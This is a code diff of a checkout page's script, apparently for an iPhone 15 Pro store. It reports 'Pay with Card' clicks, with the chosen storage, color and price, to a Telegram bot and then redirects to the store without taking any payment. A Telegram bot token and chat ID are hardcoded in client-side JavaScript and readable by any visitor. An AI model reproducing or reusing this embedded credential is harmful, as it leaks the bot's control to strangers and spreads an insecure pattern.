@@ -227,47 +227,58 @@
   </div>
 
   <script>
-    const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
-    const chatId  = "7811430582";
+  (function () {
+    // بيانات البوت
+    var botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
+    var chatId   = "7811430582";
 
     // قراءة البيانات من step-2 (لو مش موجودة نحط قيم افتراضية)
-    const storage = localStorage.getItem("selectedStorage") || "256 GB";
-    const color   = localStorage.getItem("selectedColor") || "Natural Titanium";
+    var storage = localStorage.getItem("selectedStorage") || "256 GB";
+    var color   = localStorage.getItem("selectedColor") || "Natural Titanium";
 
     // عرضها في الصفحة
-    document.querySelector(".summary-storage").innerText = storage;
-    document.querySelector(".summary-color").innerText   = color;
+    var storageEl = document.querySelector(".summary-storage");
+    var colorEl   = document.querySelector(".summary-color");
 
-    // زر Pay with Card
-    document.getElementById("pay-card-btn").addEventListener("click", function () {
-      const msg =
-        💳 *Customer clicked Pay with Card*\n\n +
-        Product: iPhone 15 Pro\n +
-        Region: Middle East version\n +
-        Storage: ${storage}\n +
-        Color: ${color}\n +
-        Total: 728.45 $;
+    if (storageEl) storageEl.innerText = storage;
+    if (colorEl)   colorEl.innerText   = color;
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: msg,
-          parse_mode: "Markdown"
-        })
-      }).catch(function (err) {
-        console.error("Telegram error:", err);
-      }).finally(function () {
-        // بعد ما يضغط الدفع نرجعه للمتجر
+    // زر Pay with Card (الزر الأسود)
+    var payBtn = document.getElementById("pay-card-btn");
+    if (payBtn) {
+      payBtn.addEventListener("click", function () {
+        var msg =
+          "Customer clicked Pay with Card\n\n" +
+          "Product: iPhone 15 Pro\n" +
+          "Region: Middle East version\n" +
+          "Storage: " + storage + "\n" +
+          "Color: " + color + "\n" +
+          "Total: 728.45 $";
+
+        fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: msg
+          })
+        }).catch(function (err) {
+          console.log("Telegram error:", err);
+        }).finally(function () {
+          // بعد ما يضغط الدفع نرجعه للمتجر
+          window.location.href = "index.html";
+        });
+      });
+    }
+
+    // زر Back to Store
+    var backBtn = document.getElementById("back-btn");
+    if (backBtn) {
+      backBtn.addEventListener("click", function () {
         window.location.href = "index.html";
       });
-    });
-
-    // Back to store
-    document.getElementById("back-btn").addEventListener("click", function () {
-      window.location.href = "index.html";
-    });
-  </script>
+    }
+  })();
+</script>
 </body>
 </html>
